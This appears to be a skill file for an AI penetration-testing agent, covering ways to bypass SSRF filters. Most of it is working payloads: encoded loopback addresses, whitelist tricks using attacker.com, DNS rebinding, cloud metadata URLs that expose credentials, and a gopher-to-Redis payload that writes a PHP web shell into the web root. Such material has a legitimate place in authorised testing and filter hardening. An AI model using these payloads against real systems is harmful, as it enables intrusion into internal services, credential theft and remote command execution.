# SSRF Filter Bypass Techniques

## When to Use This File

Consult when:
- Direct SSRF attempts return errors or blocks
- URL validation/whitelist is present
- IP address filtering detected
- Scheme restrictions in place

---

## Step 1: Identify the Filter Type

Before applying bypasses, determine what's being filtered:

```
Test sequence:
1. http://your-server.com          → External fetch works?
2. http://127.0.0.1                → Localhost blocked?
3. http://127.0.0.1:80             → Port specification blocked?
4. http://internal-hostname         → Internal DNS blocked?
5. file:///etc/passwd              → Non-HTTP schemes blocked?
6. http://your-server.com/redirect → Redirects followed?
```

| Result | Filter Type | Bypass Strategy |
|--------|------------|----------------|
| External works, localhost blocked | IP blacklist | Alternative IP representations |
| Only specific domains work | Domain whitelist | Open redirect chain, DNS rebinding |
| Only http/https work | Scheme whitelist | Redirect to other schemes |
| Everything blocked | Aggressive WAF | Encoding, DNS rebinding |

---

## IP Address Bypass Techniques

### Decimal Representation
Convert each octet to one decimal number:
```
127.0.0.1 = 2130706433
Calculator: (127 × 256³) + (0 × 256²) + (0 × 256¹) + 1
URL: http://2130706433
```

### Hexadecimal Representation
```
127.0.0.1 = 0x7f000001
URL: http://0x7f000001
Per-octet: http://0x7f.0x0.0x0.0x1
```

### Octal Representation
```
127.0.0.1 = 0177.0000.0000.0001
Mixed: http://0177.0.0.1
Leading zeros: http://0177.00000.00000.0001
```

### IPv6 Representations
```
Loopback: http://[::1]
IPv4-mapped: http://[::ffff:127.0.0.1]
IPv4-compatible: http://[0:0:0:0:0:0:127.0.0.1]
Expanded: http://[0000:0000:0000:0000:0000:0000:0000:0001]
```

### Short Forms
```
http://127.1          (127.0.0.1)
http://0              (0.0.0.0)
http://0.0.0.0
http://127.127.127.127 (also loopback in some configurations)
```

### URL-Encoded Dots
```
http://127%2e0%2e0%2e1
http://127%2E0%2E0%2E1
Double: http://127%252e0%252e0%252e1
```

---

## Domain Whitelist Bypass Techniques

### Open Redirect Chain
If a whitelisted domain has an open redirect vulnerability:
```
http://whitelisted.com/redirect?url=http://169.254.169.254/latest/meta-data/
```
The server follows the redirect from the whitelisted domain to the internal target.

**Finding open redirects on whitelisted domains:**
- Check login/logout flows
- Check OAuth callbacks
- Check marketing redirect endpoints
- Use the [[open-redirect]] skill

### DNS Rebinding `[EXTERNAL INFRA REQUIRED]`
1. Register a domain with very short TTL (e.g., 1 second)
2. First DNS response: your external IP (passes validation)
3. Second DNS response: 127.0.0.1 (actual fetch hits internal)

**Setup:**
- Use services like rebind.network or rbndr.us for quick testing
- Custom: Set up DNS server with alternating A records

**How it works:**
```
Server validates URL → resolves domain → gets external IP → passes check
Server fetches URL → resolves domain again → gets 127.0.0.1 → hits internal
```

### @ Symbol Trick
```
http://whitelisted.com@attacker.com
```
Some URL parsers extract the hostname after `@` (treating the whitelisted domain as username:password). The actual request goes to `attacker.com`.

### URL Fragment Confusion
```
http://attacker.com#@whitelisted.com
http://whitelisted.com#.attacker.com
```

### Subdomain Tricks
```
http://whitelisted.com.attacker.com    (attacker's subdomain)
http://whitelistedcom.attacker.com     (no dot)
http://attacker.whitelisted.com        (subdomain of whitelisted)
```

### URL Encoding of the Entire Domain
```
http://%77%68%69%74%65%6c%69%73%74%65%64%2e%63%6f%6d
```

---

## Scheme Bypass Techniques

### Via Redirect
If the server follows redirects and only validates the initial scheme:
```
http://your-server.com/redirect-to-file → 302 → file:///etc/passwd
http://your-server.com/redirect-to-gopher → 302 → gopher://internal:6379/_INFO
```

### Alternative Schemes to Try
```
file:///etc/passwd              → Local file read
gopher://127.0.0.1:6379/_INFO  → Redis/SMTP/other TCP protocols
dict://127.0.0.1:6379/INFO     → Dict protocol to Redis
tftp://127.0.0.1/test          → TFTP (rare but possible)
ldap://127.0.0.1/              → LDAP query
jar://file.jar!/path            → Java-specific
netdoc:///etc/passwd            → Java-specific file read
```

### Gopher Protocol Exploitation
Gopher allows sending arbitrary data to TCP ports — effectively a universal TCP client:

**Redis command execution:**
```
gopher://127.0.0.1:6379/_SET%20shell%20%22<%3Fphp%20system(%24_GET['cmd'])%3B%3F>%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A
```

**SMTP email sending:**
```
gopher://127.0.0.1:25/_MAIL%20FROM:...%0D%0ARCPT%20TO:...%0D%0ADATA%0D%0A...
```

---

## Cloud Metadata Bypass Techniques

When 169.254.169.254 is specifically blocked:

### Alternative AWS Metadata Addresses
```
http://[fd00:ec2::254]/latest/meta-data/           (IPv6 metadata)
http://169.254.169.254.xip.io/latest/meta-data/    (DNS that resolves to the IP)
http://instance-data/latest/meta-data/              (AWS internal hostname)
http://metadata.google.internal/                    (GCP)
```

### IMDSv2 Bypass
AWS IMDSv2 requires a PUT request to get a token first. If the SSRF only allows GET:
- Check if IMDSv1 is still enabled (both can coexist)
- If the SSRF allows custom methods, use PUT to get the token
- If the SSRF allows custom headers, include the token header

---

## Response Handling Bypass

### Blind SSRF Confirmation
When you can't see the response:

**Timing-based:**
```
http://internal-host:open-port      → Fast response (port open)
http://internal-host:closed-port    → Slow response or timeout (port closed)
http://slow-server.attacker.com     → Known delay confirms fetch
```

**DNS-based:** `[EXTERNAL INFRA REQUIRED]`
```
http://unique-id.attacker.com       → DNS query confirms fetch
```

**Error-based:**
```
Different error for valid vs invalid internal hosts
Different error for open vs closed ports
```

---

## Decision Logic

```
Filter detected → Identify filter type
  ├── IP blacklist → Try alt IP representations → Try DNS rebinding
  ├── Domain whitelist → Find open redirect on whitelisted domain → Try @ trick
  ├── Scheme restriction → Try redirect-based scheme switching
  └── WAF/generic block → Try encoding → Try DNS rebinding → Try header manipulation

If 3 distinct bypass categories fail → Document filter behavior and stop
```
